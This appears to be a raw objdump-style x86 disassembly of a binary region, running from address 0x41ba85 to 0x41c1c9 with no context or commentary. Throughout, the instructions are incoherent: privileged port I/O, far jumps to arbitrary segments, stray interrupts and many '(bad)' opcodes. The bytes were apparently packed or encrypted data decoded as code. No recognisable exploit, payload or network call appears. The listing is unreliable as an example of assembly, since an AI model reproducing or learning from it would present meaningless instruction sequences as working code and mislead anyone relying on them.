  41ba85:	xchg   esi,eax
  41ba86:	xor    al,BYTE PTR [edi-0x22]
  41ba89:	sbb    eax,DWORD PTR [ecx-0x6]
  41ba8c:	imul   edi,DWORD PTR [edi+0x35e67009],0x1946fad0
  41ba96:	mov    eax,ds:0x234e3f20
  41ba9b:	xchg   DWORD PTR [edx-0x395a408d],esi
  41baa1:	or     esi,DWORD PTR ds:0x864c07f0
  41baa7:	ss sahf 
  41baa9:	retf   
  41baaa:	cmp    edx,esi
  41baac:	mov    dh,0xd6
  41baae:	xor    al,0x1d
  41bab0:	jg     0x41bafe
  41bab2:	push   ds
  41bab3:	xchg   DWORD PTR [edi-0x7b],ebp
  41bab6:	cli    
  41bab7:	sub    BYTE PTR [ecx+0x314f6881],ch
  41babd:	push   ss
  41babe:	jge    0x41bb0a
  41bac0:	adc    al,al
  41bac2:	fcom   DWORD PTR [ebx+0x14802876]
  41bac8:	fsub   DWORD PTR [edi]
  41baca:	repz sbb WORD PTR [esi+0x2f251446],0xc43d
  41bad4:	xor    al,0x82
  41bad6:	mov    eax,0x656dffbb
  41badb:	mov    esi,0x6fe79954
  41bae0:	cs ret 0xb440
  41bae4:	jp     0x41ba67
  41bae6:	aam    0x85
  41bae8:	shl    ebx,0xc
  41baeb:	mov    dl,0xa8
  41baed:	dec    eax
  41baee:	fwait
  41baef:	mov    WORD PTR [esi-0x70],fs
  41baf2:	pop    edx
  41baf3:	push   esp
  41baf4:	jbe    0x41bb36
  41baf6:	xor    cl,0xf4
  41baf9:	arpl   ax,cx
  41bafb:	jle    0x41bb34
  41bafd:	(bad)  
  41bafe:	fldenv [ecx]
  41bb00:	jbe    0x41ba87
  41bb02:	in     eax,dx
  41bb03:	push   ecx
  41bb04:	fisubr WORD PTR [ecx+ecx*8-0x3]
  41bb08:	mov    ecx,0xea868868
  41bb0d:	dec    ebp
  41bb0e:	cmp    DWORD PTR [ebx-0x72],0x80c31afb
  41bb15:	aam    0x54
  41bb17:	stos   BYTE PTR es:[edi],al
  41bb18:	mov    esi,0x56fd680e
  41bb1d:	add    esi,ebx
  41bb1f:	in     al,0x88
  41bb21:	sti    
  41bb22:	test   al,0x57
  41bb24:	jbe    0x41bb61
  41bb26:	les    esi,FWORD PTR [ecx]
  41bb28:	repnz out dx,eax
  41bb2a:	push   ecx
  41bb2b:	inc    ebx
  41bb2c:	in     al,0x2c
  41bb2e:	mov    ds:0x121ac6fb,eax
  41bb33:	sub    al,0x97
  41bb35:	js     0x41bb47
  41bb37:	fisttp WORD PTR [ebx-0x29]
  41bb3a:	js     0x41bb0b
  41bb3c:	inc    esp
  41bb3d:	test   eax,0xaa53907d
  41bb42:	xchg   esp,eax
  41bb43:	scas   al,BYTE PTR es:[edi]
  41bb44:	ret    
  41bb45:	(bad)  
  41bb46:	push   ds
  41bb47:	fldl2t 
  41bb49:	push   es
  41bb4a:	leave  
  41bb4b:	cwde   
  41bb4c:	ss fld st(7)
  41bb4f:	bound  esi,QWORD PTR [ebx+0x7c]
  41bb52:	cmp    edx,esp
  41bb54:	xor    BYTE PTR cs:[edi-0x23],al
  41bb58:	cwde   
  41bb59:	gs sbb eax,0x227b29e3
  41bb5f:	and    BYTE PTR [edx-0x611cf381],0xf9
  41bb66:	test   eax,0xce40da18
  41bb6b:	adc    eax,0x293ba012
  41bb70:	in     eax,0x5a
  41bb72:	loope  0x41bb77
  41bb74:	daa    
  41bb75:	test   DWORD PTR [ebx+0x63],ecx
  41bb78:	mov    esi,0x757a9404
  41bb7d:	xor    al,0x9b
  41bb7f:	imul   eax,edi,0x3bc5c6e0
  41bb85:	call   DWORD PTR [ecx-0x659d3a36]
  41bb8b:	shl    ebx,1
  41bb8d:	dec    edx
  41bb8e:	jmp    0x59ba:0x7fef7f6b
  41bb95:	jbe    0x41bb47
  41bb97:	xchg   ebx,eax
  41bb98:	jb     0x41bbbf
  41bb9a:	sbb    ebx,DWORD PTR [ebx-0x50]
  41bb9d:	mov    esi,0xe2fd3084
  41bba2:	jl     0x41bb29
  41bba4:	fdivr  DWORD PTR [eax]
  41bba6:	in     al,0x12
  41bba8:	sbb    eax,0x9996b4a9
  41bbad:	inc    esp
  41bbae:	lds    esp,FWORD PTR [ecx-0x5a]
  41bbb1:	pop    ebx
  41bbb2:	and    BYTE PTR [edx],dl
  41bbb4:	pusha  
  41bbb5:	out    dx,al
  41bbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbb7:	pop    es
  41bbb8:	or     BYTE PTR [esp+ebx*1],bh
  41bbbb:	mov    edi,0xe3b0d5ec
  41bbc0:	inc    eax
  41bbc1:	add    BYTE PTR [ebp-0x46af6884],bh
  41bbc7:	mov    ebp,0xd811bce3
  41bbcc:	sub    cl,BYTE PTR [ebp+0x2f]
  41bbcf:	outs   dx,DWORD PTR ds:[esi]
  41bbd0:	mov    esp,0xd2f58d73
  41bbd5:	jl     0x41bb86
  41bbd7:	gs jg  0x41bba2
  41bbda:	mov    fs,WORD PTR [eax+0x36]
  41bbdd:	add    dh,0xd9
  41bbe0:	int3   
  41bbe1:	rol    BYTE PTR [esi+eax*2+0x5a39825d],1
  41bbe8:	xchg   DWORD PTR [edx+0x5f13885b],edx
  41bbee:	xor    edx,DWORD PTR [edi+0x3c53e7ee]
  41bbf4:	pop    esi
  41bbf5:	hlt    
  41bbf6:	jge    0x41bc43
  41bbf8:	xor    BYTE PTR gs:[ebx+0x45],ch
  41bbfc:	(bad)  
  41bbfd:	pop    ecx
  41bbfe:	shl    DWORD PTR ds:0x17a58f88,cl
  41bc04:	mov    ebp,0x47f544a6
  41bc09:	stc    
  41bc0a:	mov    al,dl
  41bc0c:	outs   dx,BYTE PTR ds:[esi]
  41bc0d:	mov    al,0x11
  41bc0f:	cmp    bl,bh
  41bc11:	ins    BYTE PTR es:[edi],dx
  41bc12:	lock inc edx
  41bc14:	jge    0x41bbb2
  41bc16:	dec    esp
  41bc17:	jo     0x41bc20
  41bc19:	add    eax,0xacb76101
  41bc1e:	pop    ds
  41bc1f:	idiv   DWORD PTR [ebx-0x19866474]
  41bc25:	sbb    ebp,DWORD PTR [ecx-0x41]
  41bc28:	and    bh,BYTE PTR [ecx+0x301ba5dd]
  41bc2e:	leave  
  41bc2f:	shr    DWORD PTR [edi-0xa],cl
  41bc32:	iret   
  41bc33:	(bad)  
  41bc34:	xlat   BYTE PTR ds:[ebx]
  41bc35:	push   ds
  41bc36:	cld    
  41bc37:	dec    ebp
  41bc38:	clc    
  41bc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc3a:	popa   
  41bc3b:	xchg   ebp,eax
  41bc3c:	cmp    DWORD PTR [esi],eax
  41bc3e:	(bad)  
  41bc3f:	lock rol DWORD PTR [ecx-0x77],0x5a
  41bc44:	rol    DWORD PTR [edx-0x4d775c],0x1d
  41bc4b:	and    al,0x75
  41bc4d:	in     eax,0x9f
  41bc4f:	stos   DWORD PTR es:[edi],eax
  41bc50:	jl     0x41bc7a
  41bc52:	or     al,0x29
  41bc54:	mov    gs,WORD PTR [ebp-0x7f]
  41bc57:	cmp    DWORD PTR ds:0xd238d483,ebx
  41bc5d:	nop
  41bc5e:	add    BYTE PTR [esi-0x58],ah
  41bc61:	xor    ebp,DWORD PTR [edx+0x2962b21d]
  41bc67:	xor    al,0x1c
  41bc69:	mov    ah,BYTE PTR [ebx+0x531f769d]
  41bc6f:	pop    esi
  41bc70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc71:	fbstp  TBYTE PTR [ebp+0x7c]
  41bc74:	inc    esi
  41bc75:	mov    bh,0xce
  41bc77:	inc    edi
  41bc78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc79:	mov    ecx,0xa759bda4
  41bc7e:	nop
  41bc7f:	inc    ebx
  41bc80:	sub    BYTE PTR [eax-0x4991c93b],ah
  41bc86:	jp     0x41bd06
  41bc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc89:	inc    esi
  41bc8a:	lods   al,BYTE PTR ds:[esi]
  41bc8b:	cmp    ah,BYTE PTR [edi+edx*1+0xf]
  41bc8f:	jl     0x41bc99
  41bc91:	sub    eax,ebx
  41bc93:	clc    
  41bc94:	out    dx,eax
  41bc95:	int3   
  41bc96:	fisub  WORD PTR [eax]
  41bc98:	pop    ebx
  41bc99:	enter  0x7bc,0x7c
  41bc9d:	out    0xda,al
  41bc9f:	(bad)  
  41bca0:	jge    0x41bcdd
  41bca2:	push   ebp
  41bca3:	fisttp QWORD PTR [ecx]
  41bca5:	sbb    al,0x85
  41bca7:	fiadd  WORD PTR [ebp-0x4d]
  41bcaa:	dec    ebx
  41bcab:	dec    ebx
  41bcac:	call   0x906d:0x222f81e4
  41bcb3:	push   ecx
  41bcb4:	addr16 loope 0x41bceb
  41bcb7:	add    ah,BYTE PTR [edi-0x17]
  41bcba:	ftst   
  41bcbc:	sar    DWORD PTR [edi],0xc
  41bcbf:	ror    DWORD PTR [eax+0x33a3a59c],1
  41bcc5:	mov    ebx,0x59033692
  41bcca:	xlat   BYTE PTR ds:[ebx]
  41bccb:	or     al,0xab
  41bccd:	pop    esi
  41bcce:	mov    edi,0x1192eb27
  41bcd3:	ins    BYTE PTR es:[edi],dx
  41bcd4:	jmp    0xf675b2c6
  41bcd9:	fidiv  WORD PTR [edx]
  41bcdb:	push   edx
  41bcdc:	add    dl,BYTE PTR [ecx]
  41bcde:	xor    eax,0x7cf44bfa
  41bce3:	sbb    cl,dh
  41bce5:	jo     0x41bd05
  41bce7:	sub    ah,ch
  41bce9:	repz rcr BYTE PTR [ebx+edx*8],0x43
  41bcee:	imul   ecx,DWORD PTR [eax],0xffffff9f
  41bcf1:	lods   eax,DWORD PTR ds:[esi]
  41bcf2:	dec    eax
  41bcf3:	sub    ebx,DWORD PTR [ebp+0x71d3e6f9]
  41bcf9:	mov    ah,0x54
  41bcfb:	sbb    al,0xb5
  41bcfd:	fdiv   st,st(3)
  41bcff:	outs   dx,DWORD PTR ds:[esi]
  41bd00:	aam    0xb5
  41bd02:	and    DWORD PTR [ecx-0x6828aeec],eax
  41bd08:	mov    ch,0x32
  41bd0a:	int    0x1a
  41bd0c:	adc    DWORD PTR [ebx],ecx
  41bd0e:	outs   dx,DWORD PTR ds:[esi]
  41bd0f:	jl     0x41bce9
  41bd11:	sub    DWORD PTR [edi],0x746b164f
  41bd17:	add    DWORD PTR [ebx-0x1d],0xffffffa8
  41bd1b:	ds ret 
  41bd1d:	sar    BYTE PTR [edx],cl
  41bd1f:	inc    ebx
  41bd20:	cmc    
  41bd21:	push   es
  41bd22:	cmp    eax,0xe4db3fdc
  41bd27:	pop    ebx
  41bd28:	retf   
  41bd29:	(bad)  
  41bd2a:	and    al,0xba
  41bd2c:	jae    0x41bd8c
  41bd2e:	mov    ebp,0x20c20951
  41bd33:	add    DWORD PTR ds:0x6fad9464,esp
  41bd39:	(bad)  
  41bd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3b:	data16 into 
  41bd3d:	ja     0x41bd3e
  41bd3f:	test   DWORD PTR ds:0x8085004b,esp
  41bd45:	pop    ecx
  41bd46:	lds    ebx,FWORD PTR [edi-0x1e]
  41bd49:	outs   dx,DWORD PTR fs:[esi]
  41bd4b:	(bad)  
  41bd4c:	loope  0x41bcdc
  41bd4e:	jae    0x41bdbb
  41bd50:	das    
  41bd51:	pop    ebp
  41bd52:	int    0x8e
  41bd54:	mov    bh,0x8b
  41bd56:	icebp  
  41bd57:	sar    BYTE PTR [ebp+0x79],1
  41bd5a:	cdq    
  41bd5b:	mov    bl,0xf3
  41bd5d:	aad    0xd7
  41bd5f:	dec    eax
  41bd60:	clc    
  41bd61:	leave  
  41bd62:	pushf  
  41bd63:	ss pop ebx
  41bd65:	loop   0x41bdad
  41bd67:	neg    BYTE PTR [ecx]
  41bd69:	aam    0x5c
  41bd6b:	adc    dh,al
  41bd6d:	imul   edi,DWORD PTR [edi-0x60b016ba],0x6e
  41bd74:	cwde   
  41bd75:	mov    cl,0x0
  41bd77:	icebp  
  41bd78:	xor    BYTE PTR [edx],dh
  41bd7a:	jae    0x41bd62
  41bd7c:	out    dx,eax
  41bd7d:	dec    ebx
  41bd7e:	fild   DWORD PTR [ecx]
  41bd80:	cmp    eax,0x35fb7c64
  41bd85:	ret    0xaac2
  41bd88:	and    esi,DWORD PTR [ebx-0x3f]
  41bd8b:	shl    DWORD PTR [edi],1
  41bd8d:	outs   dx,DWORD PTR ds:[esi]
  41bd8e:	push   ebp
  41bd8f:	retf   0xef7a
  41bd92:	popa   
  41bd93:	mov    ebp,0xee13d833
  41bd98:	sbb    al,0xd6
  41bd9a:	ret    
  41bd9b:	stc    
  41bd9c:	mov    dl,0x38
  41bd9e:	sbb    BYTE PTR [eax],cl
  41bda0:	jge    0x41bd92
  41bda2:	lods   eax,DWORD PTR ds:[esi]
  41bda3:	in     al,0xa0
  41bda5:	jp     0x41bd47
  41bda7:	sti    
  41bda8:	jnp    0x41bd77
  41bdaa:	rol    al,1
  41bdac:	sub    BYTE PTR [ebp+ebp*2+0x893cda2],0x9e
  41bdb4:	jl     0x41bd97
  41bdb6:	or     BYTE PTR [eax*2-0x5852dc6d],0x52
  41bdbe:	sub    eax,0xb3849cea
  41bdc3:	cmp    edx,ecx
  41bdc5:	out    0xb6,al
  41bdc7:	into   
  41bdc8:	pop    ecx
  41bdc9:	loop   0x41be10
  41bdcb:	mov    dh,0x8a
  41bdcd:	das    
  41bdce:	sbb    al,0x23
  41bdd0:	pop    ebx
  41bdd1:	sub    DWORD PTR [ecx-0x30],edi
  41bdd4:	sbb    bl,BYTE PTR [ebx-0x7162ff78]
  41bdda:	dec    ebx
  41bddb:	push   ss
  41bddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bddd:	xor    eax,0x393da6bb
  41bde2:	imul   ebx,DWORD PTR [edi+0x1f],0x52f3fb67
  41bde9:	clc    
  41bdea:	pusha  
  41bdeb:	int3   
  41bdec:	je     0x41be14
  41bdee:	push   esi
  41bdef:	iret   
  41bdf0:	jmp    0x41bda8
  41bdf2:	pop    ebx
  41bdf3:	jbe    0x41be3c
  41bdf5:	(bad)  
  41bdf6:	mov    ds:0x64a82a95,eax
  41bdfb:	mov    BYTE PTR [edi-0x42ef2027],bh
  41be01:	pop    edi
  41be02:	xchg   ecx,eax
  41be03:	(bad)  
  41be04:	mov    bl,BYTE PTR [esi]
  41be06:	ror    BYTE PTR [eax],0x54
  41be09:	fdiv   QWORD PTR [eax-0x3f]
  41be0c:	jbe    0x41bda6
  41be0e:	out    dx,eax
  41be0f:	pop    edi
  41be10:	xor    ah,al
  41be12:	push   edi
  41be13:	jge    0x41bdff
  41be15:	or     ebp,0xd423cec4
  41be1b:	fst    DWORD PTR [ebx+0x10c01a5a]
  41be21:	arpl   bp,dx
  41be23:	push   ss
  41be24:	xor    DWORD PTR [edi],eax
  41be26:	add    al,cl
  41be28:	gs mov ch,0x13
  41be2b:	arpl   WORD PTR [ecx+0x225fbbd7],sp
  41be31:	and    bh,dl
  41be33:	int    0x82
  41be35:	pushw  cs
  41be37:	push   ecx
  41be38:	rcr    ebp,0x41
  41be3b:	jmp    0x41bdc1
  41be3d:	adc    BYTE PTR [ebx-0x29],0xa1
  41be41:	rep stos BYTE PTR es:[edi],al
  41be43:	imul   esp,DWORD PTR [edi-0x65],0xa1f0154b
  41be4a:	sbb    DWORD PTR [esi],ecx
  41be4c:	mov    cl,0xb5
  41be4e:	mov    bl,0xc2
  41be50:	aas    
  41be51:	jge    0x41be1b
  41be53:	loop   0x41be40
  41be55:	and    DWORD PTR ds:0x3cd9af9,0x76e28353
  41be5f:	xchg   esp,eax
  41be60:	gs mov ch,0x49
  41be63:	dec    DWORD PTR [edi+0x14]
  41be66:	cmp    bl,al
  41be68:	popa   
  41be69:	jmp    0x7b6b:0xe781aec4
  41be70:	xchg   BYTE PTR [edx],dl
  41be72:	xchg   edx,eax
  41be73:	ds shr al,cl
  41be76:	pop    ecx
  41be77:	pop    ds
  41be78:	rcl    DWORD PTR [eax],1
  41be7a:	iret   
  41be7b:	rcr    DWORD PTR [ecx],0x8b
  41be7e:	or     al,0x77
  41be80:	fimul  WORD PTR [ecx+eax*4+0x422bb5b0]
  41be87:	sub    DWORD PTR [ebx+edi*1],esi
  41be8a:	pop    ebp
  41be8b:	sbb    ebx,DWORD PTR [edi+ecx*4-0x27e4f78c]
  41be92:	push   edi
  41be93:	cmp    ch,BYTE PTR [ebx-0x17]
  41be96:	inc    esi
  41be97:	pop    edi
  41be98:	retf   
  41be99:	pop    edi
  41be9a:	push   cs
  41be9b:	xor    al,BYTE PTR [ebp-0x9264eff]
  41bea1:	out    dx,al
  41bea2:	scas   eax,DWORD PTR es:[edi]
  41bea3:	aad    0xe
  41bea5:	loopne 0x41beec
  41bea7:	sub    ebx,DWORD PTR [edx+esi*4+0x54722842]
  41beae:	jae    0x41bea8
  41beb0:	xchg   ecx,eax
  41beb1:	cli    
  41beb2:	cmp    eax,0xe12fdc34
  41beb7:	jb     0x41beda
  41beb9:	push   ds
  41beba:	push   eax
  41bebb:	pop    ss
  41bebc:	fwait
  41bebd:	loop   0x41be65
  41bebf:	icebp  
  41bec0:	xlat   BYTE PTR ds:[ebx]
  41bec1:	ss in  eax,dx
  41bec3:	std    
  41bec4:	int    0x62
  41bec6:	jne    0x41bf1e
  41bec8:	mov    ds:0x9bfedf5d,eax
  41becd:	test   BYTE PTR [ecx-0x55],0xe6
  41bed1:	dec    esp
  41bed2:	xor    DWORD PTR [ebx+0xca4ec7f],edi
  41bed8:	xor    DWORD PTR [ecx+ecx*8],0x17
  41bedc:	daa    
  41bedd:	loope  0x41bf5e
  41bedf:	ficom  WORD PTR [eax+0x2]
  41bee2:	lds    ebx,FWORD PTR [eax+0x50]
  41bee5:	push   ss
  41bee6:	adc    eax,0x58e128e2
  41beeb:	pop    edi
  41beec:	pop    edi
  41beed:	dec    ebp
  41beee:	cmp    DWORD PTR [esi+0x37ade606],edi
  41bef4:	clc    
  41bef5:	or     BYTE PTR [ebx],bl
  41bef7:	fldenv [ebp-0x29696ce7]
  41befd:	pop    eax
  41befe:	mov    ecx,0x3188231a
  41bf03:	popa   
  41bf04:	loope  0x41bf03
  41bf06:	push   edi
  41bf07:	sub    eax,0xd501fee
  41bf0c:	cmp    BYTE PTR [ebx],0x34
  41bf0f:	pusha  
  41bf10:	daa    
  41bf11:	nop
  41bf12:	lods   al,BYTE PTR ds:[esi]
  41bf13:	pop    es
  41bf14:	mov    dh,0xc9
  41bf16:	inc    esi
  41bf17:	cmp    eax,0x8cec06c5
  41bf1c:	(bad)  
  41bf1d:	sbb    ebx,DWORD PTR [edi-0x2c]
  41bf20:	xchg   esi,eax
  41bf21:	and    DWORD PTR [ebx-0x17],edx
  41bf24:	mov    eax,DWORD PTR [eax-0x58]
  41bf27:	xor    al,0xe4
  41bf29:	mov    edi,?
  41bf2b:	jmp    0x41bf0e
  41bf2d:	inc    esp
  41bf2e:	ja     0x41bf4b
  41bf30:	jbe    0x41bfa1
  41bf32:	jb     0x41bf78
  41bf34:	test   eax,0xbdb9dc6b
  41bf39:	sahf   
  41bf3a:	xchg   ebp,eax
  41bf3b:	fwait
  41bf3c:	jne    0x41bf8f
  41bf3e:	or     bl,BYTE PTR [eax]
  41bf40:	in     eax,0xf5
  41bf42:	jp     0x41bfbb
  41bf44:	xor    DWORD PTR [ebx+ebp*2],esp
  41bf47:	es test ah,ah
  41bf4a:	das    
  41bf4b:	loopne 0x41bfa5
  41bf4d:	outs   dx,DWORD PTR ds:[esi]
  41bf4e:	mov    ah,0xef
  41bf50:	retf   0x50a7
  41bf53:	mov    WORD PTR ds:0x4e2d9e4f,cs
  41bf59:	add    DWORD PTR [edi+0x56e8e294],ecx
  41bf5f:	pop    esi
  41bf60:	xor    edx,DWORD PTR [ebp-0x215e5b6a]
  41bf66:	clc    
  41bf67:	sbb    BYTE PTR [ebx-0x25b4a5ac],al
  41bf6d:	mov    ch,BYTE PTR [esi]
  41bf6f:	push   di
  41bf71:	xchg   esi,eax
  41bf72:	push   ebp
  41bf73:	imul   ecx,DWORD PTR [ecx-0x39],0x5d42d3fb
  41bf7a:	push   edi
  41bf7b:	fcom   QWORD PTR [ecx]
  41bf7d:	aas    
  41bf7e:	mov    DWORD PTR [ebp+0x59a5ef20],ecx
  41bf84:	mov    DWORD PTR [ebx+ecx*8+0x36],eax
  41bf88:	sbb    DWORD PTR [eax],esi
  41bf8a:	in     al,0x2d
  41bf8c:	lea    esp,[edi]
  41bf8e:	or     BYTE PTR [esi-0x4],ah
  41bf91:	inc    eax
  41bf92:	pop    es
  41bf93:	cli    
  41bf94:	outs   dx,BYTE PTR ds:[esi]
  41bf95:	xchg   BYTE PTR [ecx],bh
  41bf97:	push   0xb3223d29
  41bf9c:	pop    ebp
  41bf9d:	cwde   
  41bf9e:	popa   
  41bf9f:	repnz push ss
  41bfa1:	scas   eax,DWORD PTR es:[edi]
  41bfa2:	fidiv  WORD PTR [edi-0x6d]
  41bfa5:	dec    esp
  41bfa6:	and    al,0x40
  41bfa8:	out    0xc5,eax
  41bfaa:	test   esp,esi
  41bfac:	mov    esp,0x68098838
  41bfb1:	repz or eax,0x132740ea
  41bfb7:	ds mov esi,0xee951107
  41bfbd:	into   
  41bfbe:	sbb    BYTE PTR [ecx+0x19],ah
  41bfc1:	call   0x7a1e:0xb15f3f9a
  41bfc8:	loopne 0x41c031
  41bfca:	adc    al,0xdd
  41bfcc:	mov    eax,0xa828a5de
  41bfd1:	dec    ebp
  41bfd2:	jae    0x41bf9c
  41bfd4:	xchg   BYTE PTR [edi+eiz*4-0x33155cd3],ah
  41bfdb:	clc    
  41bfdc:	inc    esp
  41bfdd:	into   
  41bfde:	pop    ds
  41bfdf:	stos   DWORD PTR es:[edi],eax
  41bfe0:	sbb    eax,0xa1732e15
  41bfe5:	push   ecx
  41bfe6:	ror    DWORD PTR [ebx+0x47b04253],cl
  41bfec:	jns    0x41c062
  41bfee:	fdiv   st,st(5)
  41bff0:	gs mov bl,0xf7
  41bff3:	into   
  41bff4:	shl    BYTE PTR [edi+0x78],1
  41bff7:	add    al,0x77
  41bff9:	sub    al,BYTE PTR [ebx+0x5e]
  41bffc:	dec    esi
  41bffd:	pop    ebp
  41bffe:	inc    esp
  41bfff:	pop    edi
  41c000:	sbb    ebx,DWORD PTR [edx+eiz*2-0x75481ccf]
  41c007:	sbb    al,0x7
  41c009:	jge    0x41bfed
  41c00b:	jb     0x41c088
  41c00d:	loope  0x41c051
  41c00f:	pushf  
  41c010:	cmc    
  41c011:	push   ecx
  41c012:	bound  edi,QWORD PTR [ebp-0x1b]
  41c015:	cmp    eax,0xf110f8a8
  41c01a:	stc    
  41c01b:	cdq    
  41c01c:	add    eax,0xcdae04ee
  41c021:	ret    0xbe9a
  41c024:	dec    edx
  41c025:	(bad)  
  41c026:	push   cs
  41c027:	pop    eax
  41c028:	or     DWORD PTR [ebp-0x215eae0f],esp
  41c02e:	sbb    DWORD PTR [eax],esi
  41c030:	sar    BYTE PTR [edi+0x144d438b],1
  41c036:	jmp    0x41c02f
  41c038:	sub    esp,ebp
  41c03a:	mov    ch,0x77
  41c03c:	(bad)  
  41c03d:	pop    ebp
  41c03e:	data16 fwait
  41c040:	adc    al,0xc1
  41c042:	clc    
  41c043:	push   edi
  41c044:	xchg   ebx,eax
  41c045:	cmp    DWORD PTR [eax+0x481d5c36],esp
  41c04b:	(bad)  
  41c04c:	rcr    DWORD PTR [ecx+edi*2+0x19b9e3dc],1
  41c053:	xor    al,0xd4
  41c055:	(bad)  
  41c056:	mov    al,ds:0x283b8d48
  41c05b:	pop    edx
  41c05c:	xchg   edx,eax
  41c05d:	jb     0x41c066
  41c05f:	or     BYTE PTR [esi-0x21b5b0db],ah
  41c065:	cmc    
  41c066:	adc    BYTE PTR [ecx+0x39fb556e],al
  41c06c:	loop   0x41c09d
  41c06e:	repz sub al,0x68
  41c071:	rcr    BYTE PTR [ebx-0x13],0x6e
  41c075:	aad    0x9a
  41c077:	jae    0x41c02f
  41c079:	pop    esp
  41c07a:	int3   
  41c07b:	mov    WORD PTR [esi+0x33a999b],cs
  41c081:	mov    esp,0x67deee73
  41c086:	scas   eax,DWORD PTR es:[edi]
  41c087:	scas   al,BYTE PTR es:[edi]
  41c088:	(bad)  
  41c08a:	inc    ebx
  41c08b:	arpl   WORD PTR [esp+esi*8],bp
  41c08e:	or     al,0xf8
  41c090:	mov    dl,0xc7
  41c092:	mov    al,0x7
  41c094:	mov    ds:0xf809f21e,eax
  41c099:	sub    BYTE PTR [edx-0xcf696d3],0x1a
  41c0a0:	sub    dl,dl
  41c0a2:	inc    edx
  41c0a3:	pop    ecx
  41c0a4:	pop    es
  41c0a5:	cmp    al,0xe5
  41c0a7:	or     DWORD PTR [esi-0x4c],edi
  41c0aa:	mov    ah,0x9f
  41c0ac:	sar    DWORD PTR [ebp-0x5b],0x39
  41c0b0:	xchg   ebx,eax
  41c0b1:	mov    BYTE PTR [ecx-0x36],al
  41c0b4:	lds    ebx,FWORD PTR [edx]
  41c0b6:	dec    esp
  41c0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0b8:	mov    cl,0x48
  41c0ba:	test   al,0x90
  41c0bc:	xchg   edx,eax
  41c0bd:	scas   al,BYTE PTR es:[edi]
  41c0be:	out    dx,al
  41c0bf:	xor    BYTE PTR [edx-0x5a],dh
  41c0c2:	fmul   st(3),st
  41c0c4:	sbb    ah,BYTE PTR [esi-0x21]
  41c0c7:	es pop ecx
  41c0c9:	enter  0xa33b,0x7f
  41c0cd:	jle    0x41c0a7
  41c0cf:	int    0x70
  41c0d1:	or     eax,0x12ba6673
  41c0d6:	mov    al,ds:0x75407c03
  41c0db:	add    al,0x4e
  41c0dd:	cmp    al,0xde
  41c0df:	add    BYTE PTR [edx*4-0x3d13f3e5],al
  41c0e6:	mov    WORD PTR [ebx],gs
  41c0e8:	mov    BYTE PTR [esi+0x24],al
  41c0eb:	xlat   BYTE PTR ds:[ebx]
  41c0ec:	and    edi,ebx
  41c0ee:	mov    eax,0xf4bed678
  41c0f3:	es in  al,0xd9
  41c0f6:	in     eax,0x14
  41c0f8:	add    ebx,DWORD PTR [eax-0x1c]
  41c0fb:	mov    ds:0x751f2f7e,al
  41c100:	xchg   esp,eax
  41c101:	shl    DWORD PTR [esi+eiz*2+0x24b2b22],1
  41c108:	mov    al,ds:0xcf1607d8
  41c10d:	fwait
  41c10e:	js     0x41c0f7
  41c110:	mov    al,0xc5
  41c112:	ins    BYTE PTR es:[edi],dx
  41c113:	lods   eax,DWORD PTR ds:[esi]
  41c114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c115:	and    DWORD PTR [ecx-0x43],esp
  41c118:	pop    ecx
  41c119:	pop    ds
  41c11a:	xchg   esi,eax
  41c11b:	jo     0x41c13c
  41c11d:	and    dh,bh
  41c11f:	adc    edi,DWORD PTR [ecx-0x28]
  41c122:	sbb    BYTE PTR [ebp-0x4d],0xa
  41c126:	add    BYTE PTR [esi+edi*8-0x53f7bbcd],bh
  41c12d:	call   0x75b5a022
  41c132:	test   BYTE PTR [eax+0x3b],cl
  41c135:	std    
  41c136:	pop    es
  41c137:	mov    ch,0x8e
  41c139:	inc    edi
  41c13a:	je     0x41c194
  41c13c:	add    al,0xbb
  41c13e:	aad    0xf4
  41c140:	sub    BYTE PTR [edi-0x57cb62db],bh
  41c146:	int    0xc5
  41c148:	sub    eax,0xbf4e0524
  41c14d:	out    0x1a,eax
  41c14f:	push   ds
  41c150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c151:	pusha  
  41c152:	xchg   esp,eax
  41c153:	xchg   edi,eax
  41c154:	xor    BYTE PTR [esi],ch
  41c156:	in     al,dx
  41c157:	cmp    bl,al
  41c159:	gs mov al,0x52
  41c15c:	ja     0x41c0e9
  41c15e:	aas    
  41c15f:	repnz test DWORD PTR [edx],eax
  41c162:	icebp  
  41c163:	pop    ds
  41c164:	andps  xmm3,XMMWORD PTR [edi]
  41c167:	dec    esp
  41c168:	sub    BYTE PTR [ebx-0x2a2287d4],0x8b
  41c16f:	loopne 0x41c1b6
  41c171:	pmaddwd mm6,QWORD PTR [esi-0x63]
  41c175:	dec    edi
  41c176:	cdq    
  41c177:	cs iret 
  41c179:	rcl    BYTE PTR ds:0xf4ec9840,0x9d
  41c180:	push   ds
  41c181:	sub    ebx,DWORD PTR [edx+0x78]
  41c184:	pop    edi
  41c185:	dec    eax
  41c186:	imul   eax,ebx,0xd872a76f
  41c18c:	push   ss
  41c18d:	lock adc eax,0x160e912
  41c193:	xchg   ebx,eax
  41c194:	jae    0x41c1d7
  41c196:	xor    ebp,DWORD PTR [eax+0x56b26dd6]
  41c19c:	out    0xc4,eax
  41c19e:	pusha  
  41c19f:	(bad)  
  41c1a1:	fbstp  TBYTE PTR [ebx+0x3e]
  41c1a4:	enter  0x2d8c,0x79
  41c1a8:	test   al,0xb1
  41c1aa:	int3   
  41c1ab:	ins    BYTE PTR es:[edi],dx
  41c1ac:	jmp    0x6f80e664
  41c1b1:	inc    esp
  41c1b2:	jge    0x41c16f
  41c1b4:	aaa    
  41c1b5:	dec    ecx
  41c1b6:	fadd   QWORD PTR [ecx+0x7c]
  41c1b9:	mov    dl,0xb6
  41c1bb:	ds mov al,0x96
  41c1be:	sti    
  41c1bf:	lea    eax,[ebp+0x59e5d949]
  41c1c5:	into   
  41c1c6:	sub    ecx,DWORD PTR [edx-0x2f]
  41c1c9:	ins    DWORD PTR es:[edi],dx
